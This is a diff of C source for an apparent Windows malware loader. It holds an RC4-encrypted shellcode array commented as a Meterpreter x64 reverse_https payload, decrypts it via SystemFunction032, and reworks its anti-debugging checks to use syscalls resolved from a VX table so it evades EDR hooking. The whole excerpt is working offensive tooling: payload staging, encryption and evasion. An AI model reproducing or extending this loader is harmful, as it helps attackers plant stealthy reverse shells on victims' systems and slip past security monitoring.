@@ -53,7 +53,7 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032)(
     struct USTRING* Img,
     struct USTRING* Key
     );
-//Maldev Academy
+//Maldev Academy Rc4
 BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
 
     // the return of SystemFunction032
@@ -77,6 +77,7 @@ BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
     return TRUE;
 }
 
+//met x64 reverse_https payload
 unsigned char Rc4CipherText[] = {
         0xA8, 0xA4, 0xCE, 0x2A, 0x86, 0xD4, 0xB6, 0x85, 0x19, 0xCC, 0x21, 0x61, 0xE1, 0xC3, 0x07, 0xFD,
         0x80, 0xFB, 0x43, 0x61, 0x3C, 0x6D, 0x2C, 0xD2, 0x15, 0xE0, 0xD9, 0x01, 0x34, 0x70, 0x0B, 0xDA,
@@ -301,9 +302,9 @@ void detectDebug() {
     
     DWORD64 isDebuggerPreset = 0;
     
-    NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
-
-    BOOL STATUS = myNtQueryProcessInformation2(
+    //NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
+    BOOL STATUS = NoahRead3(
         GetCurrentProcess(),
         ProcessDebugPort,
         &isDebuggerPreset,
@@ -320,7 +321,7 @@ void detectDebug() {
     printf("No debugger present...\n");
     DWORD64 hProcessDebugObject = NULL;
 
-    STATUS = myNtQueryProcessInformation2(
+    STATUS = NoahRead3(
         GetCurrentProcess(),
         ProcessDebugObjectHandle,
         &hProcessDebugObject,
@@ -810,7 +811,7 @@ int main() {
     //for (int i = 0; i < sizeof(buf); i++) {
     //    truePayload[i] = (BYTE)(((DWORD)buf[i] ^ 0xAA) & 0xFF);
     //}
-    detectDebug();
+ 
     //DeleteSelf();
 
 
@@ -892,6 +893,7 @@ int main() {
     GetVXTableEntry(dwDLLSize, &pSystemCalls, pNtdllBase, ppImageExportDirectory, &VxTable.QueryInfoProcess);
     VxTable.QueryInfoProcess.wRCXVal = 5;
 
+    detectDebug();
 
     //GetSystemcallAddresses(dwDLLSize, &pSystemCalls, pNtdllBase, pTextSection);
 
